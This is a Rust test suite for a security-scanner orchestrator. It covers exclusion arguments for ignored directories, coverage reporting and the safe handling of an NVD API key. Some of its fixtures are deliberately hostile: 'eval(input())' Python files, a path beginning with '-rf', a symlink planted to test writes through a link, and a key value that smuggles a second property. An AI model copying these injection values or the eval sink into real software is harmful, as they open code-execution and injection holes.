    want.extend(pairs("--skip-dirs", strings(&dirs)));
    want.extend(strings(&["--config", &w.out("empty-config.yaml"), "--timeout", "1m", "."]));
    assert!(trivy.ends_with(&want), "trivy: {trivy:?}");

    let bandit = run("bandit");
    let list = std::iter::once("./.logos".to_string()).chain(dirs.iter().map(|d| format!("./{d}"))).collect::<Vec<_>>();
    assert!(contains(&bandit, &[strings(&["--exclude"]), vec![list.join(",")]].concat()), "bandit: {bandit:?}");

    let checkov = run("checkov");
    let mut want = strings(&["--skip-path", ".logos"]);
    let root = regex::escape(w.root.to_str().unwrap());
    want.extend(pairs("--skip-path", dirs.iter().map(|d| format!(r"^(\./|{root}/)?{}(/|$)", regex::escape(d))).collect()));
    assert!(contains(&checkov, &want), "checkov: {checkov:?}");

    let dc = run("dependency-check");
    let mut want = strings(&["--exclude", "**/.logos/**"]);
    want.extend(pairs("--exclude", dirs.iter().map(|d| format!("{d}/**")).collect()));
    assert!(contains(&dc, &want), "dependency-check: {dc:?}");

    let gosec = run("gosec");
    let mut want = strings(&["-quiet"]);
    want.extend(pairs("-exclude-dir", dirs.iter().map(|d| format!("^{}(/|$)", regex::escape(d))).collect()));
    want.extend(strings(&["./..."]));
    assert!(gosec.ends_with(&want), "gosec: {gosec:?}");

    // Semgrep and OSV-Scanner are given every unignored path instead of `.`
    // (S-772): `a` and `web` are opened around `a/build` and `web/dist`.
    let targets = strings(&[".github", ".gitignore", ".ignore", "a/.gitignore", "src", "web/.gitignore", "web/src"]);
    let semgrep = run("semgrep");
    assert!(semgrep.ends_with(&[strings(&["--exclude", ".logos"]), targets.clone()].concat()), "semgrep: {semgrep:?}");
    let osv = run("osv-scanner");
    assert!(osv.ends_with(&[strings(&["--recursive"]), targets.clone()].concat()), "osv-scanner: {osv:?}");
    let gitleaks = run("gitleaks");
    assert!(!gitleaks.iter().any(|a| dirs.iter().any(|d| a.contains(d))), "gitleaks takes none: {gitleaks:?}");
    // Only the targets are proven to keep a scanner out here (S-771), and they
    // name none of the eleven misreadable directories either. The four that
    // take the list through an unproven flag still get it above, but say
    // `scanned` (BR-97); gosec's flag is proven (S-773), but it is not given
    // the eleven, so it says `scanned` too, and why.
    for o in &report.outcomes {
        let coverage = o.coverage.as_ref().unwrap_or_else(|| panic!("{} states its coverage", o.scanner));
        let excluded = ["semgrep", "osv-scanner"].contains(&o.scanner);
        assert_eq!(coverage.ignored_paths == IgnoredPaths::Excluded, excluded, "{}: {coverage:?}", o.scanner);
        assert_eq!(coverage.coverage_note.is_none(), excluded, "{}: a note exactly when scanned", o.scanner);
    }
    let note = |name: &str| outcome(&report, name).coverage.clone().unwrap().coverage_note.unwrap();
    for name in ["trivy", "bandit", "checkov", "dependency-check"] {
        assert_eq!(note(name), super::registry::FLAG_UNPROVEN, "{name}");
    }
    assert_eq!(note("gosec"), "it is not given 11 ignored directories whose name an exclusion flag could misread");

    // A scoped re-scan: Bandit reads the named path, inside an ignored
    // directory or not; Trivy, which has no path position, still runs whole.
    fs::remove_dir_all(&w.rec).unwrap();
    fs::create_dir_all(&w.rec).unwrap();
    let scope = super::resolve_scope(&w.root, &strings(&["notes/old"])).unwrap();
    let names = strings(&["semgrep", "bandit", "trivy", "osv-scanner"]);
    let scoped = w.open().unwrap().scan_in(&Selection::Only(names), Some(&scope)).unwrap();
    let bandit = run("bandit");
    assert!(bandit.ends_with(&strings(&["--exclude", "./.logos", "notes/old"])), "scoped bandit: {bandit:?}");
    let semgrep = run("semgrep");
    assert!(semgrep.ends_with(&strings(&["--exclude", ".logos", "notes/old"])), "scoped semgrep: {semgrep:?}");
    let trivy = run("trivy");
    assert!(contains(&trivy, &pairs("--skip-dirs", strings(&dirs))), "unscoped trivy: {trivy:?}");
    let osv = run("osv-scanner");
    assert!(osv.ends_with(&[strings(&["--recursive"]), targets].concat()), "unscoped osv-scanner: {osv:?}");
    // A run on named paths states no coverage; one that ran whole does.
    for name in ["semgrep", "bandit"] {
        assert_eq!(outcome(&scoped, name).coverage, None, "scoped {name}");
    }
    assert_eq!(outcome(&scoped, "osv-scanner").coverage, Some(Coverage::EXCLUDED));
    assert!(outcome(&scoped, "trivy").coverage.is_some());
}

/// Thousands of ignored directories — a `__pycache__` in every package of a
/// monorepo — never make a scanner's argv too long to start: each scanner's
/// exclusions stop at the budget, keeping the shallowest.
#[test]
fn a_huge_ignored_set_is_cut_to_the_argument_budget_keeping_the_shallowest() {
    use super::registry::IGNORED_ARGV_BUDGET;
    let mut ignored = strings(&["node_modules", "target"]);
    ignored.extend((0..5000).map(|i| format!("homeassistant/components/integration_{i:05}/__pycache__")));
    let fill = Fill {
        out: Path::new("/o"),
        extra: &[],
        scope: None,
        language: "",
        database: Path::new(""),
        pinned_config: Path::new("/p"),
        ignored: &ignored,
        targets: &Targets::Root,
        root: Some("/srv/project"),
        nvd_key_file: None,
        gitleaks_runs: false,
    };
    let none = Fill { ignored: &[], ..fill };
    for s in REGISTRY.iter().filter(|s| s.takes_exclusion_flag()) {
        let argv: Vec<String> = s.render(s.run, &fill).iter().map(|a| a.to_string_lossy().into_owned()).collect();
        let plain: Vec<String> = s.render(s.run, &none).iter().map(|a| a.to_string_lossy().into_owned()).collect();
        let added = argv.iter().map(|a| a.len() + 1).sum::<usize>() - plain.iter().map(|a| a.len() + 1).sum::<usize>();
        assert!(added <= IGNORED_ARGV_BUDGET, "{} adds {added} bytes", s.name);
        assert!(added > IGNORED_ARGV_BUDGET / 2, "{} keeps what fits: {added} bytes", s.name);
        let text = argv.join("\n");
        assert!(text.contains("node_modules") && text.contains("target"), "{} keeps the shallowest", s.name);
        assert!(text.contains("integration_00000/"), "{} keeps the first that fit", s.name);
        assert!(!text.contains("integration_04999/"), "{} leaves out the rest", s.name);
    }
}


/// The fixture shapes of the hand-run harness (S-771): a git checkout, a
/// linked worktree of it, and a non-git copy.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Shape {
    Git,
    Worktree,
    NonGit,
}

/// The harness's fixture in `shape`: `.gitignore` `/target/`, a control in
/// `app/`, the ignored `target/`, and the near misses `src/target/` and
/// `targets/`, with a root `go.mod` beside them — and, unlike the harness, a
/// Go file in `app/`, without which gosec has nothing to scan and is not
/// started (S-769). In the worktree the ignored files exist in the linked
/// checkout only, as a build would leave them.
fn harness_world(shape: Shape) -> World {
    const TRACKED: &[(&str, &str)] = &[
        (".gitignore", "/target/\n"),
        ("app/main.py", "eval(input())\n"),
        ("app/main.go", "package main\n"),
        ("src/target/main.py", "eval(input())\n"),
        ("targets/main.py", "eval(input())\n"),
        ("go.mod", "module example.com/fixture\n"),
    ];
    const IGNORED: (&str, &str) = ("target/main.py", "eval(input())\n");
    let w = World::new(if shape == Shape::Worktree { &[] } else { TRACKED });
    let base = w.root.parent().unwrap().to_path_buf();
    let commit = |dir: &Path| {
        fixture_git(dir, &base, &["init", "-q"]);
        fixture_git(dir, &base, &["add", "-A"]);
        fixture_git(dir, &base, &["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "fixture"]);
    };
    match shape {
        Shape::NonGit => {}
        Shape::Git => commit(&w.root),
        Shape::Worktree => {
            let main = base.join("main");
            for (path, body) in TRACKED {
                fs::create_dir_all(main.join(path).parent().unwrap()).unwrap();
                fs::write(main.join(path), body).unwrap();
            }
            commit(&main);
            fs::remove_dir(&w.root).unwrap();
            fixture_git(&main, &base, &["worktree", "add", "-q", w.root.to_str().unwrap()]);
            assert!(w.root.join(".git").is_file(), "a linked worktree's .git is a file");
        }
    }
    fs::create_dir_all(w.root.join("target")).unwrap();
    fs::write(w.root.join(IGNORED.0), IGNORED.1).unwrap();
    w
}

/// Each run's argv with the project root spelled `<root>` — as written, and
/// as Checkov's expression escapes it — so two checkouts of one tree compare.
fn rooted_runs(w: &World, name: &str) -> Vec<Vec<String>> {
    let root = w.root.display().to_string();
    let escaped = regex::escape(&root);
    let rooted = |a: String| a.replace(&escaped, "<root>").replace(&root, "<root>");
    w.runs(name).into_iter().map(|argv| argv.into_iter().map(rooted).collect()).collect()
}

/// Semgrep and OSV-Scanner are kept out of the ignored `target/` by the one
/// mechanism the harness proves anchored on all three shapes for them — every
/// unignored path as an explicit target, near misses included — and gosec by
/// its tree expression (S-773); each whole-project outcome says what it did
/// ([FR-SC-26]). A linked worktree and a non-git copy give the argv and the
/// outcome of the git checkout.
///
/// [FR-SC-26]: ../../../docs/specs/requirements/FR-SC-26.md
#[test]
fn semgrep_and_osv_scanner_are_given_the_unignored_paths_in_every_checkout_shape() {
    let targets = strings(&[".gitignore", "app", "go.mod", "src", "targets"]);
    // Per shape, each scanner's name, rooted argv and coverage.
    type Row = (String, Vec<Vec<String>>, Option<Coverage>);
    let mut seen: Vec<(Shape, Vec<Row>)> = Vec::new();
    for shape in [Shape::Git, Shape::Worktree, Shape::NonGit] {
        let w = harness_world(shape);
        w.all_stubs();
        let report = w.scan(&Selection::All);
        let semgrep = rooted_runs(&w, "semgrep");
        assert_eq!(
            semgrep,
            vec![[
                strings(&[
                    "scan", "--config", "p/default", "--sarif", "--output", "<root>/.logos/security/semgrep.sarif",
                    "--metrics", "off", "--disable-version-check", "--quiet", "--exclude", ".logos",
                ]),
                targets.clone(),
            ]
            .concat()],
            "{shape:?}: semgrep"
        );
        assert_eq!(
            rooted_runs(&w, "osv-scanner"),
            vec![[
                strings(&["--format", "sarif", "--output-file", "<root>/.logos/security/osv-scanner.sarif", "--recursive"]),
                targets.clone(),
            ]
            .concat()],
            "{shape:?}: osv-scanner"
        );
        assert_eq!(
            rooted_runs(&w, "gosec"),
            vec![strings(&[
                "-fmt", "sarif", "-out", "<root>/.logos/security/gosec.sarif", "-no-fail", "-quiet", "-exclude-dir",
                "^target(/|$)", "./...",
            ])],
            "{shape:?}: gosec"
        );
        let mut rows = Vec::new();
        for o in &report.outcomes {
            assert!(matches!(o.outcome, Outcome::Ran { .. }), "{shape:?}: {} ran: {:?}", o.scanner, o.outcome);
            // Excluded only by a harness-proven mechanism; an unproven flag
            // and a scanner that takes nothing say why they read `target/`.
            let want = match o.scanner {
                "semgrep" | "osv-scanner" | "gosec" => Coverage::EXCLUDED,
                "trivy" | "bandit" | "checkov" | "dependency-check" => {
                    Coverage::scanned(CoverageKind::Unproven, super::registry::FLAG_UNPROVEN.to_string())
                }
                _ => {
                    let (kind, note) = scanner(o.scanner).unwrap().reads_ignored.unwrap();
                    Coverage::scanned(kind, note.to_string())
                }
            };
            let coverage = o.coverage.clone().unwrap_or_else(|| panic!("{shape:?}: {} states its coverage", o.scanner));
            assert_eq!(coverage, want, "{shape:?}: {}", o.scanner);
            rows.push((o.scanner.to_string(), rooted_runs(&w, o.scanner), o.coverage.clone()));
        }
        seen.push((shape, rows));
    }
    let (_, git) = &seen[0];
    for (shape, rows) in &seen[1..] {
        assert_eq!(rows, git, "{shape:?} gives every scanner the git checkout's argv and outcome");
    }
}

/// When the unignored paths cannot be passed, Semgrep and OSV-Scanner are
/// given `.` as before, and their outcome says they read the ignored
/// directories and why — never a silent `excluded`.
#[test]
fn unignored_paths_that_cannot_be_passed_fall_back_to_the_root_and_say_so() {
    let budget = {
        let w = World::new(&[(".gitignore", "/target/\n"), ("target/x.py", "x")]);
        for i in 0..2500 {
            fs::write(w.root.join(format!("generated_module_number_{i:05}.py")), "x").unwrap();
        }
        w
    };
    let cases: [(World, &str); 3] = [
        (World::new(&[(".gitignore", "/target/\n"), ("target/x.py", "x"), ("-rf/x.py", "x")]), "begins with '-'"),
        (budget, "exceed the 64 KiB argument budget"),
        // Only an ignore rule outside the tree, and the ignored directory.
        (World::new(&[(".ignore", "target/\n"), ("target/x.py", "x")]), "no path lies outside"),
    ];
    for (i, (w, why)) in cases.iter().enumerate() {
        if i == 2 {
            // `.ignore` itself is a path: hide it with a rule of its own.
            fs::write(w.root.join(".ignore"), "target/\n.ignore\n").unwrap();
        }
        w.all_stubs();
        let report = w.scan(&Selection::Only(strings(&["semgrep", "osv-scanner"])));
        assert!(w.runs("semgrep")[0].ends_with(&strings(&[".logos", "."])), "{why}: semgrep is given `.`");
        assert!(w.runs("osv-scanner")[0].ends_with(&strings(&["--recursive", "."])), "{why}: osv-scanner is given `.`");
        for name in ["semgrep", "osv-scanner"] {
            let coverage = outcome(&report, name).coverage.clone().unwrap();
            assert_eq!(coverage.ignored_paths, IgnoredPaths::Scanned, "{why}: {name}");
            assert_eq!(coverage.coverage_kind, Some(CoverageKind::WholeProject), "{why}: {name}");
            let note = coverage.coverage_note.unwrap();
            assert!(note.starts_with("it is given the whole project, because ") && note.contains(why), "{why}: {note}");
        }
    }
}

/// The coverage fact per scanner, from the same [`Ignores`] the argv is
/// rendered with: every scanner has exactly one way to read the ignored
/// directories — a flag that takes them, the unignored targets, or a note
/// saying why it reads them — and states `excluded` only by the one mechanism
/// the hand-run harness proves — the unignored targets when they could be
/// passed, or a proven flag given every ignored directory (BR-97). An
/// unproven flag reads `scanned` however much it took.
#[test]
fn each_scanner_states_its_coverage_from_the_mechanism_its_template_has() {
    use super::registry::{Arg, FLAG_UNPROVEN};
    for s in &REGISTRY {
        let ways = [s.takes_exclusion_flag(), s.run.contains(&Arg::Unignored), s.reads_ignored.is_some()];
        assert_eq!(ways.iter().filter(|w| **w).count(), 1, "{}: one way, {ways:?}", s.name);
    }
    let flagged = |misread| Ignores {
        dirs: strings(&["target", "web/dist"]),
        misread,
        targets: Targets::Paths(strings(&["src", "web/src"])),
    };
    let mut pycache = strings(&["node_modules"]);
    pycache.extend((0..5000).map(|i| format!("homeassistant/components/integration_{i:05}/__pycache__")));
    let huge = Ignores { dirs: pycache, misread: 0, targets: Targets::Unpassable("the paths outside the ignored directories exceed the 64 KiB argument budget") };
    // Only misreadable names ignored: something is ignored all the same.
    let only_misread = Ignores { dirs: Vec::new(), misread: 1, targets: Targets::Paths(strings(&["src"])) };
    for s in &REGISTRY {
        assert_eq!(s.coverage(&Ignores::NONE), Coverage::EXCLUDED, "{}: nothing is ignored", s.name);
        let [clean, misread, cut, only] = [&flagged(0), &flagged(1), &huge, &only_misread].map(|i| s.coverage(i));
        match (s.takes_exclusion_flag(), s.run.contains(&Arg::Unignored)) {
            (true, _) if s.exclusion_evidence.is_some() => {
                assert_eq!(clean, Coverage::EXCLUDED, "{}: a proven flag given every directory", s.name);
                for (c, why) in [
                    (misread, "it is not given 1 ignored directory whose name"),
                    (only, "it is not given 1 ignored directory whose name"),
                    (cut, "past the 64 KiB argument budget"),
                ] {
                    assert_eq!(c.ignored_paths, IgnoredPaths::Scanned, "{}: {why}", s.name);
                    assert_eq!(c.coverage_kind, Some(CoverageKind::Partial), "{}: {why}", s.name);
                    assert!(c.coverage_note.as_deref().is_some_and(|n| n.contains(why)), "{}: {c:?}", s.name);
                }
            }
            (true, _) => {
                for c in [clean, misread, cut, only] {
                    assert_eq!(c, Coverage::scanned(CoverageKind::Unproven, FLAG_UNPROVEN.to_string()), "{}: an unproven flag", s.name);
                }
            }
            (_, true) => {
                assert_eq!(clean, Coverage::EXCLUDED, "{}", s.name);
                assert_eq!(misread, Coverage::EXCLUDED, "{}: a target list names no ignored directory", s.name);
                assert_eq!(only, Coverage::EXCLUDED, "{}", s.name);
                assert_eq!(cut.ignored_paths, IgnoredPaths::Scanned, "{}: an unpassable list", s.name);
                assert_eq!(cut.coverage_kind, Some(CoverageKind::WholeProject), "{}: an unpassable list", s.name);
            }
            _ => {
                for c in [clean, misread, cut, only] {
                    let (kind, note) = s.reads_ignored.unwrap();
                    assert_eq!(c, Coverage::scanned(kind, note.to_string()), "{}", s.name);
                }
            }
        }
    }
}

/// The targets as a scoped Fill renders them: Semgrep's path position reads
/// the named paths, ignored or not, while OSV-Scanner — which has none — runs
/// whole on the targets whatever the scope.
#[test]
fn unignored_targets_render_only_in_a_whole_project_run_of_a_path_capable_scanner() {
    let targets = Targets::Paths(strings(&[".gitignore", "app", "src"]));
    let fill = Fill {
        out: Path::new("/o"),
        extra: &[],
        scope: None,
        language: "",
        database: Path::new(""),
        pinned_config: Path::new(""),
        ignored: &[],
        targets: &targets,
        root: None,
        nvd_key_file: None,
        gitleaks_runs: false,
    };
    let render = |name: &str, fill: &Fill<'_>| -> Vec<String> {
        let s = scanner(name).unwrap();
        s.render(s.run, fill).iter().map(|a| a.to_string_lossy().into_owned()).collect()
    };
    let scope = [ScopedPath { rel: "target".to_string(), is_dir: true }];
    let scoped = Fill { scope: Some(&scope), ..fill };
    assert!(render("semgrep", &fill).ends_with(&strings(&[".logos", ".gitignore", "app", "src"])));
    assert!(render("semgrep", &scoped).ends_with(&strings(&[".logos", "target"])), "no exclusion in a scoped run");
    assert!(render("osv-scanner", &fill).ends_with(&strings(&["--recursive", ".gitignore", "app", "src"])));
    assert_eq!(render("osv-scanner", &scoped), render("osv-scanner", &fill));
    for unpassable in [Targets::Root, Targets::Unpassable("why")] {
        let fill = Fill { targets: &unpassable, ..fill };
        assert!(render("semgrep", &fill).ends_with(&strings(&[".logos", "."])), "{unpassable:?}");
        assert!(render("osv-scanner", &fill).ends_with(&strings(&["--recursive", "."])), "{unpassable:?}");
    }
}

/// A symlink beside an ignored directory is never a target: Semgrep 1.85
/// refuses a symlink given as a target (exit 2), and neither scanner follows
/// one when it walks `.`, so naming one — to the ignored directory itself, to
/// nowhere, or to a file — could only widen the scan or fail it.
#[test]
fn a_symlink_beside_an_ignored_directory_is_never_a_target() {
    let w = World::new(&[(".gitignore", "/target/\n"), ("target/x.py", "x"), ("src/a.py", "x"), ("src/deep/b.py", "x")]);
    for (link, to) in [("tlink", "target"), ("dangling", "nowhere"), ("CLAUDE.md", "src/a.py")] {
        std::os::unix::fs::symlink(to, w.root.join(link)).unwrap();
    }
    assert_eq!(super::project_ignores(&w.root).targets, Targets::Paths(strings(&[".gitignore", "src"])));
}

/// A run that started and failed states what it did with the ignored
/// directories; one Logos failed to prepare, so that no scanner process ever
/// started, states nothing.
#[test]
fn only_a_scanner_process_that_started_states_its_coverage() {
    let w = World::new(&[(".gitignore", "/target/\n"), ("target/x.py", "x"), ("src/a.py", "x"), ("src/a.go", "x")]);
    w.stub("gosec", 2);
    w.stub("gitleaks", 0);
    // A directory where Gitleaks' report goes: Logos cannot clear it.
    fs::create_dir_all(w.root.join(OUTPUT_DIR).join("gitleaks.sarif/keep")).unwrap();
    let report = w.scan(&Selection::Only(strings(&["gosec", "gitleaks"])));
    let gosec = outcome(&report, "gosec");
    assert!(matches!(gosec.outcome, Outcome::Failed { exit_code: Some(2), .. }), "{gosec:?}");
    assert_eq!(gosec.coverage, Some(Coverage::EXCLUDED), "its proven flag was given `target`");
    let gitleaks = outcome(&report, "gitleaks");
    assert!(matches!(gitleaks.outcome, Outcome::Failed { exit_code: None, .. }), "{gitleaks:?}");
    assert!(w.runs("gitleaks").is_empty(), "gitleaks never started");
    assert_eq!(gitleaks.coverage, None, "{gitleaks:?}");
}

// ── the NVD API key (FR-SC-27, S-794) ────────────────────────────────────────

/// A planted NVD API key: it must reach Dependency-Check's private file and
/// nothing else.
const NVD_KEY: &str = "LOGOSPLANTEDNVDKEY-0123-4567-89ab-cdef01234567";

fn nvd_key() -> Option<super::NvdApiKey> {
    super::NvdApiKey::new(NVD_KEY)
}

/// Shell for a Dependency-Check stub that, while it runs, records the mode and
/// the content of the file its `--propertyfile` names, when that file exists.
fn nvd_probe(w: &World) -> String {
    format!(
        "pf=''; prev=''\n\
         for a in \"$@\"; do if [ \"$prev\" = '--propertyfile' ]; then pf=\"$a\"; fi; prev=\"$a\"; done\n\
         if [ -f \"$pf\" ]; then /bin/ls -l \"$pf\" | /usr/bin/cut -c1-10 > '{mode}'; /bin/cat \"$pf\" > '{props}'; fi",
        mode = w.rec.join("nvd.mode").display(),
        props = w.rec.join("nvd.props").display(),
    )
}

fn dependency_check_stub(w: &World, exit: i32, extra: &str) {
    let script = format!("{}\n{extra}", nvd_probe(w));
    w.stub_at(&w.bin.join("dependency-check"), "dependency-check", "dependency-check", exit, &script);
}

fn scan_dependency_check(w: &World, key: Option<super::NvdApiKey>) -> ScanReport {
    w.open()
        .expect("config loads")
        .with_nvd_api_key(key)
        .scan(&Selection::Only(strings(&["dependency-check"])))
        .expect("scan runs")
}

/// FR-SC-27 AC 1: with a key set, Dependency-Check's argv carries
/// `--propertyfile` and the private file's path, and no key; the file holds
/// `nvd.api.key` with mode 0600 while the run lasts, and is gone once it ends.
#[test]
fn dependency_check_takes_the_nvd_api_key_in_a_private_file_and_never_in_its_argv() {
    let w = World::new(PROJECT);
    dependency_check_stub(&w, 0, "");
    let report = scan_dependency_check(&w, nvd_key());
    assert!(matches!(outcome(&report, "dependency-check").outcome, Outcome::Ran { .. }), "{report:?}");

    let runs = w.runs("dependency-check");
    let [argv] = runs.as_slice() else { panic!("one run: {runs:?}") };
    let file = w.out(super::NVD_KEY_FILE);
    let at = argv.iter().position(|a| a == "--propertyfile").unwrap_or_else(|| panic!("no --propertyfile: {argv:?}"));
    assert_eq!(argv[at + 1], file, "{argv:?}");
    assert!(argv.iter().all(|a| !a.contains(NVD_KEY)), "the key is in argv: {argv:?}");
    assert_eq!(fs::read_to_string(w.rec.join("nvd.props")).unwrap(), format!("nvd.api.key={NVD_KEY}\n"));
    assert_eq!(fs::read_to_string(w.rec.join("nvd.mode")).unwrap(), "-rw-------\n", "the file is the owner's only");
    assert!(fs::symlink_metadata(&file).is_err(), "the key file outlived the run");
}

/// Without a key, Dependency-Check's argv is its template's alone, and no file
/// is written; no other scanner is ever handed the key.
#[test]
fn no_key_adds_nothing_and_no_other_scanner_is_handed_one() {
    let w = World::new(PROJECT);
    dependency_check_stub(&w, 0, "");
    scan_dependency_check(&w, None);
    let runs = w.runs("dependency-check");
    assert!(runs.iter().flatten().all(|a| a != "--propertyfile"), "{runs:?}");
    assert!(!w.rec.join("nvd.props").exists());

    let orchestrator = w.open().unwrap().with_nvd_api_key(nvd_key());
    let takers: Vec<&str> = REGISTRY.iter().filter(|s| orchestrator.nvd_api_key_set(s).is_some()).map(|s| s.name).collect();
    assert_eq!(takers, ["dependency-check"]);
    let fill = Fill {
        out: Path::new("/out"),
        extra: &[],
        scope: None,
        language: "",
        database: Path::new(""),
        pinned_config: Path::new("/pinned"),
        ignored: &[],
        targets: &Targets::Root,
        root: None,
        nvd_key_file: Some(Path::new("/key")),
        gitleaks_runs: false,
    };
    for s in REGISTRY.iter().filter(|s| s.name != "dependency-check") {
        let argv = s.render(s.run, &fill);
        assert!(argv.iter().all(|a| a != "--propertyfile" && a != "/key"), "{} is handed the key file: {argv:?}", s.name);
    }
}

/// FR-SC-27, owner decision: the user's own `--nvdApiKey` or properties file in
/// `extra_args` wins — Logos adds no file — and the key reads `set` even with
/// no `NVD_API_KEY`.
#[test]
fn the_users_own_nvd_key_or_properties_file_wins_and_logos_adds_no_file() {
    let own = [
        r#"["--nvdApiKey", "users-own"]"#,
        r#"["--nvdApiKey=users-own"]"#,
        r#"["--propertyfile", "/home/u/dc.properties"]"#,
        r#"["--propertyfile=/home/u/dc.properties"]"#,
        r#"["-P", "/home/u/dc.properties"]"#,
        r#"["-P/home/u/dc.properties"]"#,
    ];
    for extra in own {
        let w = World::new(PROJECT);
        dependency_check_stub(&w, 0, "");
        w.user_config(&format!("[security_scan.dependency-check]\nextra_args = {extra}\n"));
        for key in [nvd_key(), None] {
            let orchestrator = w.open().unwrap().with_nvd_api_key(key);
            assert_eq!(orchestrator.nvd_api_key_set(scanner("dependency-check").unwrap()), Some(true), "{extra}");
        }
        scan_dependency_check(&w, nvd_key());
        let runs = w.runs("dependency-check");
        let [argv] = runs.as_slice() else { panic!("one run: {runs:?}") };
        assert!(!argv.contains(&w.out(super::NVD_KEY_FILE)), "{extra}: Logos added its file: {argv:?}");
        assert!(argv.iter().all(|a| !a.contains(NVD_KEY)), "{extra}: {argv:?}");
        assert!(!w.rec.join("nvd.props").exists(), "{extra}");
    }
}

/// The `extra_args` that hand the key are matched exactly, and their near
/// misses are not: another NVD flag, a longer flag name, a lowercase `-p`, a
/// `--P` and a value that merely contains a flag.
#[test]
fn only_a_flag_that_hands_the_key_counts_as_the_users_own() {
    use super::registry::supplies_nvd_key;
    let owns = |args: &[&str]| supplies_nvd_key(&strings(args));
    for args in [
        &["--nvdApiKey", "k"][..],
        &["--nvdApiKey=k"],
        &["--propertyfile", "f"],
        &["--propertyfile=f"],
        &["-P", "f"],
        &["-Pf"],
        &["--disableAssembly", "--nvdApiKey", "k"],
    ] {
        assert!(owns(args), "{args:?}");
    }
    for args in [
        &[][..],
        &["--nvdApiEndpoint", "https://example.test"],
        &["--nvdApiDelay", "8000"],
        &["--nvdApiKeyX", "k"],
        &["--propertyfiles", "f"],
        &["-p", "f"],
        &["--P", "f"],
        &["--project", "nvdApiKey"],
        &["--exclude", "x--nvdApiKey"],
    ] {
        assert!(!owns(args), "{args:?}");
    }
}

/// FR-SC-27 AC 2: no key file remains after a run that failed, or that wrote
/// no report; one a crashed run left is removed at the next scan's start,
/// whichever scanners it runs.
#[test]
fn no_key_file_outlives_a_failed_run_and_a_stale_one_is_swept_at_the_next_scan() {
    let w = World::new(PROJECT);
    let file = w.root.join(OUTPUT_DIR).join(super::NVD_KEY_FILE);
    dependency_check_stub(&w, 3, "");
    let report = scan_dependency_check(&w, nvd_key());
    assert!(matches!(outcome(&report, "dependency-check").outcome, Outcome::Failed { exit_code: Some(3), .. }), "{report:?}");
    assert!(w.rec.join("nvd.props").exists(), "the file existed during the run");
    assert!(fs::symlink_metadata(&file).is_err(), "the key file outlived a failed run");

    // Exits 0 but writes no report.
    write_executable(
        &w.bin.join("dependency-check"),
        &format!("#!/bin/sh\ncase \"$1\" in --version) echo 'Dependency-Check Core version 13.0.0'; exit 0;; esac\n{}\nexit 0\n", nvd_probe(&w)),
    );
    let report = scan_dependency_check(&w, nvd_key());
    assert!(matches!(outcome(&report, "dependency-check").outcome, Outcome::Failed { .. }), "{report:?}");
    assert!(fs::symlink_metadata(&file).is_err(), "the key file outlived a run that wrote no report");

    // A crash leaves one; a scan of another scanner sweeps it.
    fs::write(&file, "nvd.api.key=stale\n").unwrap();
    w.stub("semgrep", 0);
    w.scan(&Selection::Only(strings(&["semgrep"])));
    assert!(fs::symlink_metadata(&file).is_err(), "a stale key file survived the next scan's start");
}

/// A symbolic link committed or planted in the key file's place is removed,
/// never written through: the key never lands outside `.logos/security`.
#[test]
fn a_symlink_in_the_key_files_place_is_replaced_never_written_through() {
    let w = World::new(PROJECT);
    dependency_check_stub(&w, 0, "");
    let outside = w.rec.join("outside.txt");
    fs::write(&outside, "untouched\n").unwrap();
    let out_dir = w.root.join(OUTPUT_DIR);
    fs::create_dir_all(&out_dir).unwrap();
    // `scan_in` sweeps it at its start; plant it again where only the run's
    // own create can meet it, by planting it after the sweep through the
    // version probe, which runs between the two.
    let file = out_dir.join(super::NVD_KEY_FILE);
    write_executable(
        &w.bin.join("dependency-check"),
        &format!(
            "#!/bin/sh\ncase \"$1\" in --version) /bin/ln -sf '{}' '{}'; echo 'Dependency-Check Core version 13.0.0'; exit 0;; esac\n{}\nexit 0\n",
            outside.display(),
            file.display(),
            nvd_probe(&w)
        ),
    );
    scan_dependency_check(&w, nvd_key());
    assert_eq!(fs::read_to_string(&outside).unwrap(), "untouched\n", "the key was written through the link");
    assert_eq!(fs::read_to_string(w.rec.join("nvd.props")).unwrap(), format!("nvd.api.key={NVD_KEY}\n"));
    assert!(fs::symlink_metadata(&file).is_err());
}

/// FR-SC-27 AC 3: a Dependency-Check that echoes the key it was handed, on
/// stderr or on stdout and more than once, carries it into no outcome.
#[test]
fn a_scanner_echoing_the_key_carries_it_into_no_outcome() {
    for echo in ["/bin/cat \"$pf\" \"$pf\" >&2", "/bin/cat \"$pf\" \"$pf\""] {
        let w = World::new(PROJECT);
        dependency_check_stub(&w, 2, echo);
        let report = scan_dependency_check(&w, nvd_key());
        let Outcome::Failed { stderr, .. } = &outcome(&report, "dependency-check").outcome else {
            panic!("{report:?}")
        };
        assert!(!stderr.contains(NVD_KEY), "{echo}: {stderr}");
        assert_eq!(stderr.matches(&format!("nvd.api.key={}", super::mask::MASK)).count(), 2, "{echo}: the output is kept, each echo masked: {stderr}");
    }
}

/// FR-SC-27 AC 3, NFR-SE-08: no repository file supplies the key — a `.env`
/// naming it changes nothing, and a repository config naming it is refused
/// before anything starts.
#[test]
fn a_repository_env_file_or_config_never_supplies_the_key() {
    let w = World::new(PROJECT);
    dependency_check_stub(&w, 0, "");
    fs::write(w.root.join(".env"), format!("{}={NVD_KEY}\n", super::NVD_API_KEY_ENV)).unwrap();
    let orchestrator = w.open().unwrap();
    assert_eq!(orchestrator.nvd_api_key_set(scanner("dependency-check").unwrap()), Some(false));
    scan_dependency_check(&w, None);
    assert!(w.runs("dependency-check").iter().flatten().all(|a| a != "--propertyfile"));

    // The repository's own value, not the user's: a config error may quote the
    // repository's line, which is the repository's content, never the user's key.
    for config in [
        "[security_scan.dependency-check]\nextra_args = [\"--nvdApiKey\", \"repo-key\"]\n",
        "[security_scan.dependency-check]\nnvd_api_key = \"repo-key\"\n",
    ] {
        w.repo_config(config);
        let runs = w.runs("dependency-check").len();
        assert!(matches!(w.open(), Err(ConfigError::Parse { .. } | ConfigError::InvalidValue { .. })), "{config}");
        assert_eq!(w.runs("dependency-check").len(), runs, "nothing started");
    }
}

/// The properties file escapes the key as `java.util.Properties` reads it
/// back, so no character of a key ends its line or sets another property.
#[test]
fn the_key_file_escapes_every_character_a_properties_reader_would_misread() {
    let props = |key: &str| super::NvdApiKey::new(key).unwrap().properties();
    assert_eq!(props("0123-abcd"), "nvd.api.key=0123-abcd\n");
    assert_eq!(props("k\nanalyzer.x.enabled=true"), "nvd.api.key=k\\nanalyzer.x.enabled\\=true\n");
